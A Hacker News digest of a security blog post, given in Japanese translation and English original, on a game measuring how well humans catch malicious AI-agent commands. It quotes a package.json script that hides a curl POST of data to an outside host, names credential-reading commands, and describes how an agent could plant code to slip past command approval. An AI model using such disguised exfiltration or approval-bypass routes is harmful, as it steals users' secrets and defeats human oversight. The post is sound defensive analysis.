---
source: "https://scalex.dev/blog/ai-agent-permissions-stats/"
hn_url: "https://news.ycombinator.com/item?id=49195468"
title: "Humans missed 1 in 3 threats approving AI agent commands across 40k game runs"
article_title: "Humans missed 1 in 3 threats approving AI agent commands across 40,000 plays | Scale X"
author: "Wirbelwind"
captured_at: "2026-08-06T12:51:34Z"
capture_tool: "hn-digest"
hn_id: 49195468
score: 3
comments: 1
posted_at: "2026-08-06T11:58:07Z"
tags:
  - hacker-news
  - translated
---

# Humans missed 1 in 3 threats approving AI agent commands across 40k game runs

- HN: [49195468](https://news.ycombinator.com/item?id=49195468)
- Source: [scalex.dev](https://scalex.dev/blog/ai-agent-permissions-stats/)
- Score: 3
- Comments: 1
- Posted: 2026-08-06T11:58:07Z

## Translation

タイトル: 人間は 40,000 回のゲーム実行で AI エージェントのコマンドを承認する脅威の 3 分の 1 を見逃しました
記事のタイトル: 人間は 40,000 回の再生で AI エージェントのコマンドを承認する脅威の 3 分の 1 を見逃した |スケールX
説明: AI エージェント許可ゲームの結果: どの攻撃が人間のレビュー担当者に勝ち、どの安全なコマンドが代わりにブロックされました。

記事本文:
ナビゲーションを切り替え
スケール X ホーム
人間は 40,000 回の再生で AI エージェントのコマンドを承認する脅威の 3 分の 1 を見逃しました
数か月前、私は小さなブラウザ ゲームを公開しました。AI コーディング エージェントの人間参加者として、時間の制約の下でそのコマンドを承認または拒否します。一部のコマンドは日常的なもの ( git status 、 npm test ) ですが、他のいくつかのコマンドは、エージェントが憑依されてリモート サーバーにシークレットを送信していることを示します ( cat ~/.aws/credentials )。コマンドを実行するエージェントに関連する脅威とその軽減方法の詳細については、元の投稿を参照してください。
このゲームはハッカー ニュースである程度の関心を集めました。統計を追加すると (残念ながら少し後になりますが)、40,000 件を超える実行と 409,000 件の個別の承認/拒否の決定のデータを詳しく調べることができます。不正エージェントに対する最後の防衛線である人間参加型がどのように機能したかを見てみましょう。
平均的なプレイヤーは 3 回の脅威に 1 回失敗します (平均精度 66.3%)
セッションの 32.9% がマイナスのスコアで終了しました。承認された脅威とブロックされた安全なコマンドによるペナルティが、正しく行われたすべてのことを上回りました。
プレイヤーの 35.2% がすべての脅威をキャッチしましたが、安全なコマンドの最大 5 分の 1 をブロックしながら、それを実行できたプレイヤーはわずか 20.8% でした。残りはすべてをブロックすることで部分的に到達しました（「人間のボトルネック」の称号を獲得）
7% がすべてのプロンプトを承認しました: --dangerously-skip-permissions の大ファン
ちょっとした注意点: これはゲームであり、プレイヤーが目にしたコマンドの約 34% が脅威でした。私たちの日常業務では、このような脅威が現れることはほとんどありません。プレーヤーたちは、自分たちがタイムボックス付きのチャレンジで試されていると知っていました。ただし、以下の数字は、脅威とその一般的な認識を相互に比較する際の洞察を得るのに役立つかもしれません。
脅威のカテゴリとミス率
あからさまにd

破壊的なコマンドは最も確実に捕捉されます。実際に資格情報を抜き出すコマンドは、3 倍の頻度で見逃されます。
ゲーム内で最もミスされやすいコマンドは npm runanalyze で、64.7% の確率で承認されました。通常、コマンド自体には問題はありません。しかし、npm run が実際に行うことは、プロジェクトの package.json で定義されたスクリプトを実行することです。
バンドル アナライザーの実行などの無害なコード、または以前にファイルに書き込まれた挿入されたコードである可能性があります。
ゲームでは、エージェントの履歴ログにスクリプトの実際の内容が表示されます。
1 ✻ バンドル アナライザーを実行します。これはプロジェクト スクリプトですでに設定されています。
2 // package.json → スクリプト
3 "分析": "webpack-bundle-analyzer stats.json | tee /dev/fd/1 | tee /dev/fd/1
4カール -s -X POST https://api.bundle.track/report -d @-"
とにかくプレイヤーの 3 分の 2 がそれを承認しました。これは、許可プロンプトのすぐ上にある履歴ログが詳しく読まれていない可能性があることを示しています。
ゲームにはこれらが 3 つあり、最もミスされたリストに表示されます。
合計すると、この 3 つは 52.5% (n=9,482) で失敗しましたが、他のすべての窃取スタイルの攻撃では 28.4% でした。ペイロードを馴染みのあるスクリプト名の背後に隠すと、ペイロードが履歴ログに表示されている場合でも、成功率が約 2 倍になります。
これは実際には、より大きな問題の兆候であり、ハッカー ニュース スレッドで dns_snek によってよく述べられています。
これは、危険な行為がどのように無害であると認識されるかを示す良い例です。特定のコマンドを承認するモデル全体がまったくおかしいです。
npm run build = package.jsonに記述された任意のシェルコマンドを実行します。
一方、エージェントは承認なしに次のいずれかを実行した可能性があります。
任意のビルド コマンドを含むように package.json を編集しました
build.js に悪意のあるコードを埋め込む ( npm run build によって呼び出される)
悪意のあるコードをnode_moに埋め込む

dules/xyz/index.js ( build.js によってインポート)
ユーザーにコマンドの検証を求めることは、ほぼ常に安全ですが、ファイルが変更されたために安全ではなくなりますが、強力な安全策とは言えません。
プレッシャーによりミス率が上昇
人間的な以前の指摘によると、パーミッション疲労はクロード コードでは実際に存在しており、次の引用が続きます。
ユーザーの承認が増えれば増えるほど、承認に対する注意力が低下し、時間が経つにつれて、承認に対する注意力が大幅に低下します。
また、これはユーザーに脅威について警告する短いゲームですが、ゲーム実行の終わりに向けていくつかの劣化の兆候が見られます。
上のグラフは、セッション中の脅威ミス率を示しており、ユーザーが完了したコマンドの数に基づいてプレイがグループ化されています。ユーザーが完了したコマンドの数が少ないのは、ユーザーがコマンドを確認するのに時間がかかったことが原因であるか、ペナルティとしてエラーが発生した後に数秒間ゲームがフリーズしたことが原因である可能性があります。
単純にすべてをブロックしたユーザーをすべて削除しました。
どのグループも最初の数回のコマンド (ウォーミング アップ?) で改善し、その後、ミス率は最後に向けて再び上昇します。ただし、これはクロックが切れて追加のコマンドを入力するためにプレイヤーがミスを犯しやすくなるというストレスの可能性もあります。
警戒の代償: 過剰なブロック
次のコマンドは意図的には無害ですが、日常的にブロックされていました。
npm config set registry https://npm.internal — 59% の確率でブロックされます (内部ミラーの設定)
rm -rf dist/ — 45% の確率でブロックされます (ビルド出力のクリア。新しいビルドの前に実行することは珍しくありません)
kill $(lsof -t -i:3000) — 43% の確率でブロックされました (サーバーがリッスンしているポートを解放します。プロセスのクラッシュが原因である可能性があります)
これは、人間関係者のジレンマの裏側です。ユーザーはコマンドの承認を求められます

ds は実際には無害であり、それらをブロックするとエージェントの速度が低下します。時間が経つと、このノイズによりユーザーが警戒を怠り、悪意のあるコマンドを承認してしまう可能性があります。 Anthropic の「自動モード」などの機能は、ユーザーに尋ねる前にコマンドが安全かどうかを自動的に判断することでこの問題を軽減しようとしますが、前の投稿で述べたように絶対確実ではありません。
cat ~/.zshrc はプレイヤーの 45.9% によって承認され、ゲーム内で最も意見の分かれるコマンドです。 (HN で提起された) 反対意見は正当です。多くの開発者はシェル プロファイルに秘密を保持していないため、開発者にとっては無害です。そこで API キーをエクスポートする多くの人にとって、それは認証情報の開示となります。コマンドのリスクは、エージェントが認識できない設定に完全に依存します。代わりに .zshrc から別のシークレット ファイルを取得すると、エージェントがより多くのアクセス権を取得するリスクが軽減されます。
私は、人間参加型に関するディスカッションを楽しみながら追跡し、その過程でパーミッション モデルについてさらに学ぶことができました。これは単なるゲームではありますが、AI コーディング エージェントの安全策としての人間参加に関するいくつかの問題を示していることがわかりました。
大量のノイズは疲労を引き起こし、開発者はリスクを迅速に判断するために何が変更されたのかを常に把握できるとは限りません。
開発者にとっては、さまざまな権限モデルのトレードオフや、サンドボックスの適用、資格情報と環境変数シークレットの分離など、関連するリスクを軽減する方法をよく理解しておく必要があります。
元の投稿では、これらの実際的な緩和策のいくつかについて説明しています。
ゲームで運試ししたい場合は、ここで見つけることができます: https://llmgame.scalex.dev
こんにちは - 私はアレックスです。私は開発者のセキュリティと、ソフトウェア システムの構築と拡張のトレードオフについて書いています。 Uberの元スタッフエンジニア。
投稿ごとに 1 通のメール、それ以外は何もありません。いつでも購読を解除してください。

© Alex Wauters 2026 · Hugo で構築

## Original Extract

Results from AI agent permission game: which attacks beat human reviewers, and which safe commands got blocked instead.

Toggle navigation
Scale X Home
Humans missed 1 in 3 threats approving AI agent commands across 40,000 plays
A couple of months ago I published a small browser game : you play the human-in-the-loop for an AI coding agent, approving or denying its commands under time pressure. Some commands are routine ( git status , npm test ) and some other commands indicate your agent has been possessed and is sending your secrets to a remote server ( cat ~/.aws/credentials ). More on the threats associated with agents running commands and how to mitigate them can be found in the original post .
The game garnered some interest on hacker news , and after adding in statistics (unfortunately a bit later on) we can take a closer look at the data of over 40,000 runs and 409,000 individual approve/deny decisions. Let’s see how the human-in-the-loop, our last line of defence against rogue agents, fared.
The average player missed 1 in 3 threats (mean accuracy 66.3%)
32.9% of sessions ended with a negative score: penalties from approved threats and blocked safe commands outweighed everything done right
35.2% of players caught every threat, but only 20.8% managed that while blocking at most 1 in 5 of the safe commands. The rest got there partly by blocking everything (awarding the “Human Bottleneck” title)
7% approved every single prompt: big fans of --dangerously-skip-permissions
Small caveat: this was a game, where approximately 34% of the commands players saw were threats. In our day-to-day work these threats appear rarely. Players knew they were being tested in a time-boxed challenge. But the numbers below might be useful for garnering some insights on comparing threats and the general awareness of them against one another.
Threat categories and miss rates
The blatantly destructive commands are caught most reliably. The commands that actually exfiltrate your credentials are missed three times as often.
The single most-missed command in the game is npm run analyze , approved 64.7% of the time. The command by itself is typically innocent. But what npm run really does is run a script that’s defined in your project’s package.json .
It could be benign code such as running a bundle analyzer, or injected code that was written to file before.
The game does tell you in the agent’s history log what that script actually contains:
1 ✻ I'll run the bundle analyzer — it's already set up in the project scripts.
2 // package.json → scripts
3 "analyze": "webpack-bundle-analyzer stats.json | tee /dev/fd/1 |
4 curl -s -X POST https://api.bundle.track/report -d @-"
Two thirds of players approved it anyway, indicating the history log just above the permission prompt may not be read closely.
There are three of these in the game, and they appear in the most-missed list:
Pooled, the three were missed 52.5% of the time (n=9,482) against 28.4% for every other exfiltration-style attack. Hiding a payload behind a familiar script name roughly doubles its success rate even when the payload is shown in the history log.
Which is really a symptom of the bigger problem, well put by dns_snek in the Hacker News thread :
That’s a great example of how dangerous actions are perceived as innocent. The entire model of approving specific commands is absolutely bonkers.
npm run build = run an arbitrary shell command written in package.json
Meanwhile the agent could have done any of the following without approval:
edited package.json to contain any arbitrary build command
planted malicious code in build.js (called by npm run build )
planted malicious code in node_modules/xyz/index.js (imported by build.js )
Asking the user to validate commands, which are nearly all of the time safe, but aren’t anymore because of modified files, is not a strong safeguard.
Miss rates increase under pressure
Anthropic previously noted permission fatigue is real in claude code, with the following quote:
The more approvals a user sees, the less attention they pay to each, becoming over time much less diligent in their supervision
And although it’s a short game where the user is warned about threats, we can see some signs of degradation towards the end of game runs:
The graph above shows the threat miss rate along the session, with the plays grouped together on how many commands the user completed. Users completing a lower number of commands can be due to the user taking more time to review them, or because of the game freezing for a couple of seconds after an error was made as penalty.
I’ve removed all the users who simply blocked everything.
Every group improves over the first couple of commands (warming up?) and then the miss rates climb back up towards the end. Although this might also be the stress of the clock running out and the player becoming more likely to make mistakes to get some extra commands in.
The cost of vigilance: over-blocking
The following commands were benign in intent, but routinely blocked:
npm config set registry https://npm.internal — blocked 59% of the time (setting an internal mirror)
rm -rf dist/ — blocked 45% of the time (clearing build output, not uncommon to perform before a new build)
kill $(lsof -t -i:3000) — blocked 43% of the time (freeing the port the server is listening on, potentially because of a crashed process)
This is the other side of the human-in-the-loop dilemma. Users are asked to approve commands which are actually benign, and blocking them slows the agent down. Over time this noise will likely result in users dropping their guard and approving malicious commands. Features such as Anthropic’s ‘Auto Mode’ try to mitigate this by automatically trying to determine if a command is safe before asking you, but they are not fool-proof as mentioned in the previous post .
cat ~/.zshrc was approved by 45.9% of players, the most divisive command in the game. The objection (raised on HN) is fair: plenty of developers keep no secrets in their shell profile, so for them it is harmless. For the many who export API keys there, it’s credential disclosure. The command’s risk depends entirely on a setup the agent can’t see. If you source a separate secrets file from your .zshrc instead, the risk of your agent getting more access is reduced.
I’ve enjoyed following the discussions on the human-in-the-loop, and learning more on permission models along the way. While it’s just a game, I find it does demonstrate several issues with humans-in-the-loop as safeguard for AI coding agents.
The high amount of noise introduces fatigue, and developers don’t always have the context of what has changed to quickly determine the risk.
For developers, we need to be very familiar with the trade-offs of different permissions models and how to reduce the risks involved such as applying sandboxing and separating credentials and env var secrets.
The original post covers some of these practical mitigations.
If you want to try your luck at the game, you can find it here: https://llmgame.scalex.dev
Hi - I'm Alex. I write about developer security and the tradeoffs of building and scaling software systems. Ex-Staff Engineer at Uber.
One mail per post, nothing else. Unsubscribe any time.
© Alex Wauters 2026 · Built with Hugo
